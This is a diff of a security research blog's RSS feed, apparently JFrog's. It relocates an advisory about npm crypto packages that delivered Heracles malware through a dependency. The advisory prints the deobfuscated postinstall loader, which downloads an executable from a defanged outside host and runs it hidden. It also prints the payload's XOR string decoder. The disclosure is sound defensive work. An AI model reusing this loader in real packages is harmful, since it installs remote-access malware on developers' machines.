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>]]></content:encoded>
         </item>
         <item>
-            <title><![CDATA[Crypto packages on NPM deliver Heracles malware via dependency]]></title>
-            <link>https://research.jfrog.com/post/crypto-packages-npm-deliver-heracles-malware/</link>
-            <guid>https://research.jfrog.com/post/crypto-packages-npm-deliver-heracles-malware/</guid>
-            <pubDate>Tue, 11 Nov 2025 00:00:00 GMT</pubDate>
-            <description><![CDATA[Our team found and reported crypto packages that delivered known malware via a dependency, with a total of nearly 2K downloads]]></description>
-            <content:encoded><![CDATA[
-Our research team recently analyzed three new npm packages, all of which contain known malware, all published by the user ‘**walletwave’** with a total of nearly 2K downloads:
-
-* @walletwave/ui \- XRAY-744788  
-* @walletwave/backend \- XRAY-744789  
-* @walletwave/core \- XRAY-744787
-
-![](/img/RealTimePostImage/post/crypto-npm-heracles-walletwave-core.png)
-*@walletwave/core live on npm, prior to it's removal*
-
-While the first two seem like legitimate crypto packages for walletwave that use solana, they have a dependency package ‘**@walletwave/core’**:
-
-```json
-"dependencies": {
-    "@walletwave/core": "^1.2.0",
-    "@solana/web3.js": "^1.87.6",
-    "bs58": "^5.0.0"
-  },
-```
-
-The package in the dependencies has obfuscated code that runs **automatically** after installation. After opening the obfuscation, we discovered a suspicious download and execute code that is started automatically in the postinstall.js file (de-fanged):
-
-```javascript
-const fs = require('fs'), path = require('path'), os = require('os'), {spawn} = require('child_process'), https = require('https');
-const exeUrl = 'hxxrs[:]//dependency-bot[.]pages[.]dev/npm.txt', tempDir = os.tmpdir(), exeFilePath = path.join(tempDir, 'npm.exe');
-https.get(exeUrl, _0x13bbf8 => {
-    ;
-    if (_0x13bbf8.statusCode === 200) {
-        const _0x24178f = fs.createWriteStream(exeFilePath);
-        _0x13bbf8.pipe(_0x24178f);
-        _0x24178f.on('finish', () => {
-            ;
-            _0x24178f.close();
-            const _0x47d5df = spawn(exeFilePath, [], {
-                'detached': true,
-                'stdio': 'ignore',
-                'shell': true
-            });
-            _0x47d5df.unref();
-        });
-        ...
-    }
-    ...
-}
-```
-
-Further analysis of the file shows it is a highly obfuscated .NET file, a variant of **MSILHeracles**, as shown in this [VirusTotal Analysis](https://www.virustotal.com/gui/file/ef3186bf1455b9e9152c33f7bf60a21fde1ea42b7c24e84b7f1c6e4cca383328/detection).  
-The obfuscation is comprehensive, employing techniques such as renaming functions and variables, and concealing strings using Base64 and XOR encoding.
-
-```c#
-public static string aA07ueRVVptZcwMsE3Vl(string encryptedText)
-{
-    string @string = Encoding.UTF8.GetString(Convert.FromBase64String("VExTSld1Zw=="));
-    List<char> list = new List<char>();
-    int num = 0;
-    byte[] array = Convert.FromBase64String(encryptedText);
-    byte[] array2 = array;
-    foreach (byte b in array2)
-    {
-        char item = Strings.Chr((int)checked((byte)(b ^ Strings.Asc(@string[num]))));
-        list.Add(item);
-        num = checked(num + 1) % @string.Length;
-    }
-    return new string(list.ToArray());
-}
-```
-
-While revealing all IOC might be difficult with static analysis, it is clear that the code contains malicious intent, such as remote socket connections, dynamic assembly loading from base64, and even Remote Access Trojan (RAT) capabilities, including screen capture and desktop utilities.
-
-Final payload hash \- ef3186bf1455b9e9152c33f7bf60a21fde1ea42b7c24e84b7f1c6e4cca383328
-
-JFrog Xray has been updated to protect against these malicious packages. We recommend that anyone who has been compromised immediately remove these packages and run a full analysis on the endpoints that installed them.
-]]></content:encoded>
-        </item>
-        <item>
             <title><![CDATA[Big Red - Indonesian-based Self-replicating Malicious Spam Campaign detected in npm]]></title>
             <link>https://research.jfrog.com/post/big-red-npm-campaign/</link>
             <guid>https://research.jfrog.com/post/big-red-npm-campaign/</guid>
@@ -16811,6 +16733,86 @@ Frog Curation customers are protected, as all of the relevant packages were adde
 | noirdnv | novvvee@gmail.com |
 | doaortu | adesumani63@gmail.com |
 | voinza | vendraaku@gmail.com |]]></content:encoded>
+        </item>
+        <item>
+            <title><![CDATA[Crypto packages on NPM deliver Heracles malware via dependency]]></title>
+            <link>https://research.jfrog.com/post/crypto-packages-npm-deliver-heracles-malware/</link>
+            <guid>https://research.jfrog.com/post/crypto-packages-npm-deliver-heracles-malware/</guid>
+            <pubDate>Tue, 11 Nov 2025 00:00:00 GMT</pubDate>
+            <description><![CDATA[Our team found and reported crypto packages that delivered known malware via a dependency, with a total of nearly 2K downloads]]></description>
+            <content:encoded><![CDATA[
+Our research team recently analyzed three new npm packages, all of which contain known malware, all published by the user ‘**walletwave’** with a total of nearly 2K downloads:
+
+* @walletwave/ui \- XRAY-744788  
+* @walletwave/backend \- XRAY-744789  
+* @walletwave/core \- XRAY-744787
+
+![](/img/RealTimePostImage/post/crypto-npm-heracles-walletwave-core.png)
+*@walletwave/core live on npm, prior to it's removal*
+
+While the first two seem like legitimate crypto packages for walletwave that use solana, they have a dependency package ‘**@walletwave/core’**:
+
+```json
+"dependencies": {
+    "@walletwave/core": "^1.2.0",
+    "@solana/web3.js": "^1.87.6",
+    "bs58": "^5.0.0"
+  },
+```
+
+The package in the dependencies has obfuscated code that runs **automatically** after installation. After opening the obfuscation, we discovered a suspicious download and execute code that is started automatically in the postinstall.js file (de-fanged):
+
+```javascript
+const fs = require('fs'), path = require('path'), os = require('os'), {spawn} = require('child_process'), https = require('https');
+const exeUrl = 'hxxrs[:]//dependency-bot[.]pages[.]dev/npm.txt', tempDir = os.tmpdir(), exeFilePath = path.join(tempDir, 'npm.exe');
+https.get(exeUrl, _0x13bbf8 => {
+    ;
+    if (_0x13bbf8.statusCode === 200) {
+        const _0x24178f = fs.createWriteStream(exeFilePath);
+        _0x13bbf8.pipe(_0x24178f);
+        _0x24178f.on('finish', () => {
+            ;
+            _0x24178f.close();
+            const _0x47d5df = spawn(exeFilePath, [], {
+                'detached': true,
+                'stdio': 'ignore',
+                'shell': true
+            });
+            _0x47d5df.unref();
+        });
+        ...
+    }
+    ...
+}
+```
+
+Further analysis of the file shows it is a highly obfuscated .NET file, a variant of **MSILHeracles**, as shown in this [VirusTotal Analysis](https://www.virustotal.com/gui/file/ef3186bf1455b9e9152c33f7bf60a21fde1ea42b7c24e84b7f1c6e4cca383328/detection).  
+The obfuscation is comprehensive, employing techniques such as renaming functions and variables, and concealing strings using Base64 and XOR encoding.
+
+```c#
+public static string aA07ueRVVptZcwMsE3Vl(string encryptedText)
+{
+    string @string = Encoding.UTF8.GetString(Convert.FromBase64String("VExTSld1Zw=="));
+    List<char> list = new List<char>();
+    int num = 0;
+    byte[] array = Convert.FromBase64String(encryptedText);
+    byte[] array2 = array;
+    foreach (byte b in array2)
+    {
+        char item = Strings.Chr((int)checked((byte)(b ^ Strings.Asc(@string[num]))));
+        list.Add(item);
+        num = checked(num + 1) % @string.Length;
+    }
+    return new string(list.ToArray());
+}
+```
+
+While revealing all IOC might be difficult with static analysis, it is clear that the code contains malicious intent, such as remote socket connections, dynamic assembly loading from base64, and even Remote Access Trojan (RAT) capabilities, including screen capture and desktop utilities.
+
+Final payload hash \- ef3186bf1455b9e9152c33f7bf60a21fde1ea42b7c24e84b7f1c6e4cca383328
+
+JFrog Xray has been updated to protect against these malicious packages. We recommend that anyone who has been compromised immediately remove these packages and run a full analysis on the endpoints that installed them.
+]]></content:encoded>
         </item>
         <item>
             <title><![CDATA[Five Backdoored Cryptography Packages Operating Undetected for Six Months]]></title>
